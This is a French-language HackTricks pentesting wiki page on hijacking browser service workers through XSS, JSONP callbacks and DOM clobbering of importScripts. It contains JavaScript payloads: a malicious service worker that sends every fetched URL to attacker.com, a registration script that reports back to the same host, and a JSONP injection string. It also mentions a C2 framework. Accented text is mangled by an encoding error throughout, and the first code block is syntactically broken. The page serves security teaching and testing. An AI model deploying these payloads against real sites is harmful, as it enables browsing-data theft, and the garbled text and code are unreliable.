# Abus des Travailleurs de Service

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©**? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks**? ou voulez-vous avoir acc√®s √† la **derni√®re version du PEASS ou t√©l√©charger HackTricks en PDF**? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** **üê¶**[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PRs au** [**d√©p√¥t hacktricks**](https://github.com/carlospolop/hacktricks) **et** [**d√©p√¥t hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Trouvez les vuln√©rabilit√©s les plus importantes afin de pouvoir les corriger plus rapidement. Intruder suit votre surface d'attaque, lance des analyses de menaces proactives, trouve des probl√®mes dans l'ensemble de votre pile technologique, des API aux applications web et aux syst√®mes cloud. [**Essayez-le gratuitement**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) aujourd'hui.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Informations de Base

Un **travailleur de service** est un script ex√©cut√© par votre navigateur en arri√®re-plan, ind√©pendamment de toute page web, permettant des fonctionnalit√©s qui ne n√©cessitent pas une page web ou une interaction utilisateur, am√©liorant ainsi les capacit√©s de **traitement hors ligne et en arri√®re-plan**. Des informations d√©taill√©es sur les travailleurs de service peuvent √™tre trouv√©es [ici](https://developers.google.com/web/fundamentals/primers/service-workers). En exploitant les travailleurs de service au sein d'un domaine web vuln√©rable, les attaquants peuvent prendre le contr√¥le des interactions de la victime avec toutes les pages de ce domaine.

### V√©rification des Travailleurs de Service Existants

Les travailleurs de service existants peuvent √™tre v√©rifi√©s dans la section **Travailleurs de Service** de l'onglet **Application** dans les **Outils de D√©veloppement**. Une autre m√©thode consiste √† visiter [chrome://serviceworker-internals](https://chromium.googlesource.com/chromium/src/+/main/docs/security/chrome%3A/serviceworker-internals) pour une vue plus d√©taill√©e.

### Notifications Push

Les **autorisations de notification push** impactent directement la capacit√© d'un **travailleur de service** √† communiquer avec le serveur sans interaction directe de l'utilisateur. Si les autorisations sont refus√©es, cela limite le potentiel du travailleur de service √† poser une menace continue. En revanche, accorder des autorisations augmente les risques de s√©curit√© en permettant la r√©ception et l'ex√©cution d'exploitations potentielles.

## Attaque Cr√©ant un Travailleur de Service

Pour exploiter cette vuln√©rabilit√©, vous devez trouver :

* Un moyen de **charger des fichiers JS arbitraires** sur le serveur et un **XSS pour charger le travailleur de service** du fichier JS charg√©
* Une **requ√™te JSONP vuln√©rable** o√π vous pouvez **manipuler la sortie (avec du code JS arbitraire)** et un **XSS** pour **charger le JSONP avec une charge utile** qui **chargera un travailleur de service malveillant**.

Dans l'exemple suivant, je vais pr√©senter un code pour **enregistrer un nouveau travailleur de service** qui √©coutera l'√©v√©nement `fetch` et **enverra vers le serveur des attaquants chaque URL r√©cup√©r√©e** (c'est le code dont vous auriez besoin de **charger** sur le **serveur** ou de charger via une r√©ponse **JSONP vuln√©rable**) :
```javascript
self.addEventListener('fetch', function(e) {
e.respondWith(caches.match(e.request).then(function(response) {
fetch('https://attacker.com/fetch_url/' + e.request.url)
});
```
Et voici le code qui va **enregistrer le worker** (le code que vous devriez pouvoir ex√©cuter en abusant d'un **XSS**). Dans ce cas, une requ√™te **GET** sera envoy√©e au serveur des **attaquants** pour **notifier** si l'**enregistrement** du service worker a √©t√© r√©ussi ou non:
```javascript
<script>
window.addEventListener('load', function() {
var sw = "/uploaded/ws_js.js";
navigator.serviceWorker.register(sw, {scope: '/'})
.then(function(registration) {
var xhttp2 = new XMLHttpRequest();
xhttp2.open("GET", "https://attacker.com/SW/success", true);
xhttp2.send();
}, function (err) {
var xhttp2 = new XMLHttpRequest();
xhttp2.open("GET", "https://attacker.com/SW/error", true);
xhttp2.send();
});
});
</script>
```
En cas d'abus d'un point de terminaison JSONP vuln√©rable, vous devez placer la valeur √† l'int√©rieur de `var sw`. Par exemple:
```javascript
var sw = "/jsonp?callback=onfetch=function(e){ e.respondWith(caches.match(e.request).then(function(response){ fetch('https://attacker.com/fetch_url/' + e.request.url) }) )}//";
```
Il existe un **C2** d√©di√© √† l'**exploitation des Travailleurs de Service** appel√© [**Shadow Workers**](https://shadow-workers.github.io) qui sera tr√®s utile pour abuser de ces vuln√©rabilit√©s.

La directive de **cache de 24 heures** limite la dur√©e de vie d'un **travailleur de service (SW)** malveillant ou compromis √† au plus 24 heures apr√®s la correction d'une vuln√©rabilit√© XSS, en supposant un statut client en ligne. Pour minimiser la vuln√©rabilit√©, les op√©rateurs de site peuvent r√©duire le Temps de Vie (TTL) du script SW. Les d√©veloppeurs sont √©galement invit√©s √† cr√©er un [**interrupteur d'arr√™t du travailleur de service**](https://stackoverflow.com/questions/33986976/how-can-i-remove-a-buggy-service-worker-or-implement-a-kill-switch/38980776#38980776) pour une d√©sactivation rapide.

## Abus de `importScripts` dans un SW via le DOM Clobbering

La fonction **`importScripts`** appel√©e depuis un Travailleur de Service peut **importer un script depuis un domaine diff√©rent**. Si cette fonction est appel√©e en utilisant un **param√®tre qu'un attaquant pourrait** modifier, il pourrait **importer un script JS depuis son domaine** et obtenir une XSS.

**Cela contourne m√™me les protections CSP.**

**Exemple de code vuln√©rable:**

* **index.html**
```html
<script>
navigator.serviceWorker.register('/dom-invader/testcases/augmented-dom-import-scripts/sw.js' + location.search);
// attacker controls location.search
</script>
```
* **sw.js**
```javascript
const searchParams = new URLSearchParams(location.search);
let host = searchParams.get('host');
self.importScripts(host + "/sw_extra.js");
//host can be controllable by an attacker
```
### Avec le DOM Clobbering

Pour plus d'informations sur ce qu'est le DOM Clobbering, consultez :

{% content-ref url="dom-clobbering.md" %}
[dom-clobbering.md](dom-clobbering.md)
{% endcontent-ref %}

Si l'URL/domaine utilis√© par le SW pour appeler **`importScripts`** est **√† l'int√©rieur d'un √©l√©ment HTML**, il est **possible de le modifier via le DOM Clobbering** pour faire en sorte que le SW **charge un script depuis votre propre domaine**.

Pour un exemple, consultez le lien de r√©f√©rence.

## R√©f√©rences

* [https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering](https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering)

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Trouvez les vuln√©rabilit√©s les plus importantes afin de pouvoir les corriger plus rapidement. Intruder suit votre surface d'attaque, lance des analyses de menaces proactives, trouve des probl√®mes sur l'ensemble de votre pile technologique, des APIs aux applications web et aux syst√®mes cloud. [**Essayez-le gratuitement**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) aujourd'hui.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ? ou souhaitez-vous avoir acc√®s √† la **derni√®re version du PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** **üê¶**[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PRs au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
